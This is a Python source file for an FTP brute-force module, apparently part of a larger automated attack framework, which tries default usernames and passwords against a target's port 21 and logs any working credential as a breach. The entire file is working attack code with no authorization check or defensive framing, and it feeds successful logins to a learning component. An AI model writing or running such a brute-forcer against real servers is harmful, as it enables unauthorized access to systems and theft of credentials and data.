
import asyncio
from ftplib import FTP
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class FTPBruteforceModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "ftp_bruteforce", "success": False, "risk": 7}

        host = options['context']['target'].split('/')[2].split(':')[0]
        port = 21

        users = ["anonymous", "ftp", "admin", "root"]
        passwords = ["", "anonymous", "ftp", "password"]

        self.logger.info(f"FTP BRUTEFORCE → {host}:{port}")

        for user in users:
            for pwd in passwords:
                try:
                    ftp = await asyncio.to_thread(FTP, timeout=5)
                    await asyncio.to_thread(ftp.connect, host, port)
                    await asyncio.to_thread(ftp.login, user, pwd)
                    result.update({
                        "success": True,
                        "vulnerable_payload": f"{user}:{pwd}",
                        "data_leaked": {"user": user, "password": pwd}
                    })
                    self.logger.breach(f"FTP: {user}:{pwd}")
                    if self.brain:
                        self.brain.learn("ftp_bruteforce", target, f"{user}:{pwd}", True)
                    ftp.quit()
                    return result
                except:
                    try: ftp.quit()
                    except: pass
                    continue

        return result